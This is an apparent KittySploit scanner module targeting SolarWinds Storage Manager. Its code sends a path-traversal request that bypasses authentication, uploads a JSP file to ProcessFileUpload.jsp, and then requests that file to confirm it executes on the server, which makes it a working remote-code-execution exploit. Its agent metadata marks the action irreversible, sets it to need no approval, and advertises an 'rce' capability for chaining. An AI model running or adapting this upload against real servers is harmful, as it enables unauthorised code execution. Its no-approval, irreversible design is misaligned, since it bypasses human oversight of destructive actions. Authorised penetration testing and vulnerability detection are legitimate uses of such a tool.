#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarWinds Storage Manager ProcessFileUpload.jsp auth bypass upload."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarWinds Storage Manager - ProcessFileUpload Detection',
        'description': (
            'Detects unauthenticated JSP upload via /images/../jsp/ProcessFileUpload.jsp '
            'path traversal auth filter bypass.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'solarwinds', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/34786',
        ],
    }

    def run(self):
        marker = self.random_text(10)
        fname = f'_ks_{self.random_text(6)}_.jsp'
        boundary = '_Part_316_1523688081_377140406'
        jsp = f'<%@ page language="Java" import="java.util.*"%>\r\n<%\r\nout.println("{marker}");\r\n%>\r\n'
        body = (
            f'\r\n--{boundary}\r\n'
            f'Content-Disposition: form-data; name="ljyu"; filename="{fname}"\r\n'
            'Content-Type: application/octet-stream\r\n\r\n'
            f'{jsp}\r\n'
            f'--{boundary}--\r\n'
        )
        r = self.http_request(
            method='POST',
            path='/images/../jsp/ProcessFileUpload.jsp',
            data=body,
            headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
            allow_redirects=False,
        )
        if not r or 'Upload Successful' not in (r.text or ''):
            return False
        g = self.http_request(method='GET', path=f'/images/../{fname}', allow_redirects=False)
        if g and marker in (g.text or ''):
            self.set_info(
                severity='critical',
                reason='SolarWinds Storage Manager JSP upload',
                path='/jsp/ProcessFileUpload.jsp',
            )
            return True
        return False
